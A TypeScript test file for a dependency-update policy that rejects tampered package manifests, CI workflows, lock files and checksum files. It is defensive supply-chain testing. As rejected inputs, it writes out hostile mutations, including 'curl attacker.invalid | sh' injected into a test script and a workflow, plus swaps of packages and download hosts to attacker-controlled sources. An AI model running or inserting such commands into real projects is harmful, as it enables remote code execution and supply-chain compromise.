import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import test from "node:test";
import { safeUpgrade, validateDependencyFile } from "./policy.mts";

test("only stable, nonbreaking, forward dependency updates can merge automatically", () => {
  safeUpgrade("1.2.3", "1.3.0"); safeUpgrade("v0.4.1", "v0.4.2");
  for (const pair of [["1.2.3", "2.0.0"], ["0.4.1", "0.5.0"], ["1.2.3", "1.2.2"], ["1.2.3", "1.2.4-beta.1"]]) assert.throws(() => safeUpgrade(pair[0]!, pair[1]!));
});

test("dependency manifests cannot smuggle install scripts, sources or new packages", () => {
  const source = JSON.stringify({ scripts: { test: "vitest run" }, dependencies: { example: "1.2.3" } });
  const updated = source.replace("1.2.3", "1.2.4");
  assert.equal(validateDependencyFile("web/app/package.json", source, updated)[0]!.after, "1.2.4");
  for (const mutation of [updated.replace("vitest run", "curl attacker.invalid | sh"), updated.replace("1.2.4", "https://attacker.invalid/pkg.tgz"), updated.replace('"example":', '"another":')]) assert.throws(() => validateDependencyFile("web/app/package.json", source, mutation));
  assert.throws(() => validateDependencyFile("internal/server/server.go", "old source", "new source"));
});

test("action digest updates cannot change workflow commands, permissions or action identity", () => {
  const source = "steps:\n  - uses: actions/checkout@" + "a".repeat(40) + " # v7.0.1\npermissions: {}\n";
  const updated = source.replace("a".repeat(40), "b".repeat(40)).replace("v7.0.1", "v7.0.2");
  validateDependencyFile(".github/workflows/ci.yml", source, updated);
  for (const changed of [updated.replace("permissions: {}", "permissions: write-all"), updated.replace("actions/checkout", "attacker/checkout"), updated + "run: curl attacker.invalid | sh\n", updated.replace("v7.0.2", "v8.0.0")]) assert.throws(() => validateDependencyFile(".github/workflows/ci.yml", source, changed));
});

test("a lock refresh cannot replace an upstream repository or download host", () => {
  const source = readFileSync("tools/security/runtime.lock", "utf8");
  const updated = source.replaceAll("0.18.0", "0.18.1");
  validateDependencyFile("tools/security/runtime.lock", source, updated);
  for (const changed of [updated.replace("sigstore/gitsign", "attacker/gitsign"), updated.replace("https://github.com", "https://attacker.invalid"), updated.replace('provenance = "cosign"', 'provenance = "none"')]) assert.throws(() => validateDependencyFile("tools/security/runtime.lock", source, changed));
});

test("a binary checksum refresh preserves the upstream package and both architectures", () => {
  const source = readFileSync("tools/dependencies/assets.json", "utf8");
  const updated = source.replaceAll("v2.103.3", "v2.103.4");
  validateDependencyFile("tools/dependencies/assets.json", source, updated);
  assert.throws(() => validateDependencyFile("tools/dependencies/assets.json", source, updated.replace("cli/cli", "attacker/cli")));
});
